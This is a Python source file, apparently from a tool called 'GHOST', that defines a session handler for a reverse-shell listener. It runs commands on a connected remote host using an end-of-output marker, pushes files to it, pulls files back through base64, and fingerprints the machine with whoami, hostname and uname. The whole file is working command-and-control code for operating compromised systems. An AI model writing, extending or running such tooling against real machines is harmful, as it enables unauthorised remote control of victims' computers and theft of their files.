import socket
import time
import os
from utils.helpers import format_duration


class Session:
    def __init__(self, session_id, conn, addr):
        self.id = session_id
        self.conn = conn
        self.ip = addr[0]
        self.port = addr[1]
        self.connected_at = time.time()
        self.os = "Unknown"
        self.user = "Unknown"
        self.hostname = "Unknown"
        self.cwd = "~"
        self.alive = True

    @property
    def duration(self):
        return format_duration(int(time.time() - self.connected_at))

    def send(self, cmd):
        """Send command to remote shell."""
        try:
            self.conn.send((cmd + "\n").encode("utf-8"))
            return True
        except Exception:
            self.alive = False
            return False

    def recv(self, timeout=10, buffer=65536):
        """Receive output from remote shell."""
        self.conn.settimeout(timeout)
        output = b""
        try:
            while True:
                chunk = self.conn.recv(buffer)
                if not chunk:
                    self.alive = False
                    break
                output += chunk
                # Stop reading when prompt marker or short pause
                if output.endswith(b"GHOST_END\n") or output.endswith(b"GHOST_END"):
                    output = output.replace(b"GHOST_END\n", b"").replace(b"GHOST_END", b"")
                    break
                if len(chunk) < buffer:
                    break
        except socket.timeout:
            pass
        except Exception:
            self.alive = False

        return output.decode("utf-8", errors="ignore").strip()

    def execute(self, cmd, timeout=15):
        """Send command and return output."""
        if not self.alive:
            return None
        # Wrap command to signal end of output
        wrapped = f"{cmd}; echo GHOST_END 2>/dev/null || echo GHOST_END"
        if not self.send(wrapped):
            return None
        return self.recv(timeout=timeout)

    def upload(self, local_path, remote_path=None):
        """Upload file to remote session."""
        if not os.path.exists(local_path):
            return False, "Local file not found"

        remote_path = remote_path or os.path.basename(local_path)

        try:
            with open(local_path, "rb") as f:
                data = f.read()

            import base64
            encoded = base64.b64encode(data).decode()

            # Send via echo + base64 decode on remote
            cmd = f"echo '{encoded}' | base64 -d > {remote_path}"
            result = self.execute(cmd)
            return True, f"Uploaded {len(data)} bytes → {remote_path}"
        except Exception as e:
            return False, str(e)

    def download(self, remote_path, local_path=None):
        """Download file from remote session."""
        local_path = local_path or os.path.basename(remote_path)

        try:
            import base64
            cmd = f"base64 {remote_path}"
            encoded = self.execute(cmd, timeout=30)

            if not encoded:
                return False, "No data received"

            data = base64.b64decode(encoded)
            with open(local_path, "wb") as f:
                f.write(data)

            return True, f"Downloaded {len(data)} bytes → {local_path}"
        except Exception as e:
            return False, str(e)

    def get_sysinfo(self):
        """Fetch basic system info from remote."""
        info = {}
        cmds = {
            "os": "uname -s 2>/dev/null || echo Windows",
            "hostname": "hostname",
            "user": "whoami",
            "cwd": "pwd",
            "ip": "hostname -I 2>/dev/null | awk '{print $1}' || ipconfig | grep IPv4 | head -1",
        }
        for key, cmd in cmds.items():
            result = self.execute(cmd, timeout=5)
            if result:
                info[key] = result.strip().split("\n")[0]

        self.os = info.get("os", "Unknown")
        self.user = info.get("user", "Unknown")
        self.hostname = info.get("hostname", "Unknown")
        self.cwd = info.get("cwd", "~")
        return info

    def close(self):
        """Close the session."""
        try:
            self.conn.close()
        except Exception:
            pass
        self.alive = False

    def __repr__(self):
        return f"Session(id={self.id}, ip={self.ip}, user={self.user}, os={self.os})"
